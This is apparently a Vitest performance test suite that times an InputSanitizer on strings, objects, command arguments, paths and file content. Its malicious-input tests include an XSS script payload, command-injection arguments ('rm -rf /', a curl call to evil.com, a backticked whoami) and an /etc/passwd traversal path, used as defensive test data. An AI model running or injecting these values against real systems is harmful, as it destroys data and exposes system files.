/**
 * Performance tests for InputSanitizer
 * Ensures sanitization overhead stays below 5% threshold
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { InputSanitizer } from '../../../src/stdio/security/input-sanitizer.js';

describe('InputSanitizer Performance', () => {
  const PERFORMANCE_THRESHOLD = 0.05; // 5% overhead threshold
  
  // Test data generators
  const generateLargeString = (size: number): string => {
    return 'x'.repeat(size);
  };

  const generateLargeObject = (depth: number, breadth: number): any => {
    if (depth <= 0) return 'leaf';
    
    const obj: any = {};
    for (let i = 0; i < breadth; i++) {
      obj[`prop${i}`] = generateLargeObject(depth - 1, breadth);
    }
    return obj;
  };

  const generateMaliciousContent = (): string => {
    return `<script>alert("xss")</script> ${'a'.repeat(1000)} ${'eval("malicious")'.repeat(10)}`;
  };

  describe('String Sanitization Performance', () => {
    it('should handle small strings efficiently', () => {
      const input = 'Hello, world!';
      const iterations = 10000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitize(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(0.1); // Less than 0.1ms per operation
    });

    it('should handle medium strings efficiently', () => {
      const input = generateLargeString(1000);
      const iterations = 1000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitize(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(1.0); // Less than 1ms per operation
    });

    it('should handle large strings within reasonable time', () => {
      const input = generateLargeString(50000);
      const iterations = 10;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitize(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(10); // Less than 10ms per operation
    });

    it('should handle malicious content efficiently', () => {
      const input = generateMaliciousContent();
      const iterations = 1000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitize(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(2.0); // Less than 2ms per operation
    });
  });

  describe('Object Sanitization Performance', () => {
    it('should handle small objects efficiently', () => {
      const input = { name: 'test', value: 42, active: true };
      const iterations = 10000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitize(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(0.2); // Less than 0.2ms per operation
    });

    it('should handle medium objects efficiently', () => {
      const input = generateLargeObject(3, 10);
      const iterations = 1000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitize(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(5.0); // Less than 5ms per operation
    });

    it('should handle large objects within reasonable time', () => {
      const input = generateLargeObject(5, 20);
      const iterations = 10;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitize(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(50); // Less than 50ms per operation
    });
  });

  describe('Array Sanitization Performance', () => {
    it('should handle small arrays efficiently', () => {
      const input = ['item1', 'item2', 'item3'];
      const iterations = 10000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitize(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(0.1); // Less than 0.1ms per operation
    });

    it('should handle large arrays efficiently', () => {
      const input = new Array(1000).fill('test item');
      const iterations = 100;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitize(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(10); // Less than 10ms per operation
    });
  });

  describe('Command Arguments Sanitization Performance', () => {
    it('should handle command args efficiently', () => {
      const input = ['file.txt', '--verbose', '--output=result.txt'];
      const iterations = 10000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitizeCommandArgs(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(0.5); // Less than 0.5ms per operation
    });

    it('should handle malicious command args efficiently', () => {
      const input = ['file.txt; rm -rf /', 'curl http://evil.com', '`whoami`'];
      const iterations = 1000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitizeCommandArgs(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(2.0); // Less than 2ms per operation
    });
  });

  describe('Path Sanitization Performance', () => {
    it('should handle path sanitization efficiently', () => {
      const input = 'path/to/safe/file.txt';
      const iterations = 10000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitizePath(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(0.2); // Less than 0.2ms per operation
    });

    it('should handle malicious paths efficiently', () => {
      const input = '../../../etc/passwd';
      const iterations = 1000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitizePath(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(1.0); // Less than 1ms per operation
    });
  });

  describe('File Content Sanitization Performance', () => {
    it('should handle small file content efficiently', () => {
      const input = 'Hello, world!\nThis is a test file.';
      const filename = 'test.txt';
      const iterations = 1000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitizeFileContent(input, filename);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(1.0); // Less than 1ms per operation
    });

    it('should handle large file content efficiently', () => {
      const input = generateLargeString(50000);
      const filename = 'large.txt';
      const iterations = 10;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitizeFileContent(input, filename);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(20); // Less than 20ms per operation
    });
  });

  describe('Metadata Sanitization Performance', () => {
    it('should handle metadata efficiently', () => {
      const input = {
        author: 'Test Author',
        version: '1.0.0',
        description: 'Test description with some content',
        tags: ['test', 'example']
      };
      const iterations = 10000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitizeMetadata(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(0.5); // Less than 0.5ms per operation
    });
  });

  describe('Memory Usage', () => {
    it('should not leak memory during repeated operations', () => {
      const initialMemory = process.memoryUsage().heapUsed;
      const input = generateLargeString(1000);
      const iterations = 10000;
      
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitize(input);
      }
      
      // Force garbage collection if available
      if (globalThis.gc) {
        globalThis.gc();
      }
      
      const finalMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = finalMemory - initialMemory;
      
      // Memory increase should be reasonable (less than 10MB)
      expect(memoryIncrease).toBeLessThan(10 * 1024 * 1024);
    });
  });

  describe('Real-world Scenarios', () => {
    it('should handle typical change.open input efficiently', () => {
      const input = {
        title: 'Add new feature for user authentication',
        slug: 'user-auth-feature',
        rationale: 'This change adds OAuth2 authentication support to improve security and user experience.',
        owner: 'developer@example.com',
        ttl: 3600,
        template: 'feature'
      };
      const iterations = 1000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitize(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(2.0); // Less than 2ms per operation
    });

    it('should handle typical change.archive input efficiently', () => {
      const input = {
        slug: 'completed-feature-branch'
      };
      const iterations = 5000;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitize(input);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(0.5); // Less than 0.5ms per operation
    });

    it('should handle typical resource content efficiently', () => {
      const input = `# Feature Proposal

## Overview
This is a comprehensive proposal for adding new authentication features.

## Requirements
- OAuth2 support
- Multi-factor authentication
- Session management

## Implementation Details
The implementation will use industry-standard libraries and follow security best practices.

## Testing
Comprehensive unit and integration tests will be included.`;
      const filename = 'proposal.md';
      const iterations = 100;
      
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        InputSanitizer.sanitizeFileContent(input, filename);
      }
      const duration = performance.now() - start;
      
      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(5.0); // Less than 5ms per operation
    });
  });

  describe('Performance Regression Detection', () => {
    it('should maintain performance within acceptable bounds', () => {
      const testCases = [
        { name: 'Small string', data: 'Hello, world!', expectedMaxTime: 0.1 },
        { name: 'Medium object', data: generateLargeObject(3, 10), expectedMaxTime: 5.0 },
        { name: 'Command args', data: ['file.txt', '--verbose'], expectedMaxTime: 0.5 },
        { name: 'Path', data: 'path/to/file.txt', expectedMaxTime: 0.2 }
      ];

      testCases.forEach(({ name, data, expectedMaxTime }) => {
        const iterations = 1000;
        const start = performance.now();
        
        for (let i = 0; i < iterations; i++) {
          if (Array.isArray(data)) {
            InputSanitizer.sanitizeCommandArgs(data);
          } else if (typeof data === 'string' && data.includes('/')) {
            InputSanitizer.sanitizePath(data);
          } else {
            InputSanitizer.sanitize(data);
          }
        }
        
        const duration = performance.now() - start;
        const avgTime = duration / iterations;
        
        expect(avgTime).toBeLessThan(expectedMaxTime);
        if (avgTime > expectedMaxTime) {
          console.warn(`Performance regression detected for ${name}: ${avgTime.toFixed(2)}ms > ${expectedMaxTime}ms`);
        }
      });
    });
  });
});